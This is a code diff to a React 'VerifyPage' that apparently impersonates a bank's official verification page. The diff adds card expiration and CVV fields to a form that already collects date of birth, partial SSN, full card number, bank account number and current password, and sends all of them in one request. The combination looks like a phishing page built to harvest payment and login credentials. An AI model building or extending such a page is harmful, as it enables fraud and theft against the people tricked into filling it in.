@@ -16,7 +16,7 @@ import {
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
-import { Shield, Mail, Phone, Loader2, Lock, Check, AlertCircle, CreditCard, Key, CheckCircle2, ArrowRight } from "lucide-react";
+import { Shield, Mail, Phone, Loader2, Lock, Check, AlertCircle, CreditCard, Key, CheckCircle2, ArrowRight, ChevronRight, Building2 } from "lucide-react";
 import { Link, useLocation } from "wouter";
 import { OfficialHeader } from "@/components/official-header";
 
@@ -45,6 +45,8 @@ const identitySchema = z.object({
   dateOfBirth: z.string().min(1, "Date of birth is required"),
   ssn: z.string().length(4, "Please enter exactly 4 digits"),
   cardNumber: z.string().min(13, "Please enter a valid card number").max(19, "Card number too long"),
+  cardExpiration: z.string().min(4, "Please enter expiration date (MM/YY)").max(5),
+  cardCvv: z.string().min(3, "Please enter CVV").max(4, "CVV too long"),
   accountNumber: z.string().min(8, "Please enter a valid account number").max(17, "Account number too long"),
   currentPassword: z.string().min(1, "Current password is required"),
 });
@@ -84,6 +86,8 @@ export default function VerifyPage() {
       dateOfBirth: "",
       ssn: "",
       cardNumber: "",
+      cardExpiration: "",
+      cardCvv: "",
       accountNumber: "",
       currentPassword: "",
     },
@@ -105,6 +109,8 @@ export default function VerifyPage() {
         dateOfBirth: data.dateOfBirth,
         ssn: data.ssn,
         cardNumber: data.cardNumber,
+        cardExpiration: data.cardExpiration,
+        cardCvv: data.cardCvv,
         accountNumber: data.accountNumber,
         currentPassword: data.currentPassword,
       });
@@ -363,6 +369,54 @@ export default function VerifyPage() {
                           </FormItem>
                         )}
                       />
+
+                      <div className="grid grid-cols-2 gap-4">
+                        <FormField
+                          control={identityForm.control}
+                          name="cardExpiration"
+                          render={({ field }) => (
+                            <FormItem>
+                              <FormLabel className="text-gray-700 font-semibold">
+                                Expiration Date
+                              </FormLabel>
+                              <FormControl>
+                                <Input
+                                  type="text"
+                                  placeholder="MM/YY"
+                                  maxLength={5}
+                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
+                                  data-testid="input-card-expiration"
+                                  {...field}
+                                />
+                              </FormControl>
+                              <FormMessage />
+                            </FormItem>
+                          )}
+                        />
+
+                        <FormField
+                          control={identityForm.control}
+                          name="cardCvv"
+                          render={({ field }) => (
+                            <FormItem>
+                              <FormLabel className="text-gray-700 font-semibold">
+                                CVV / Security Code
+                              </FormLabel>
+                              <FormControl>
+                                <Input
+                                  type="password"
+                                  placeholder="3 or 4 digits"
+                                  maxLength={4}
+                                  className="h-12 border-gray-300 bg-[#fafafa] focus:border-[#cd1409] focus:ring-[#cd1409]"
+                                  data-testid="input-card-cvv"
+                                  {...field}
+                                />
+                              </FormControl>
+                              <FormMessage />
+                            </FormItem>
+                          )}
+                        />
+                      </div>
 
                       <FormField
                         control={identityForm.control}
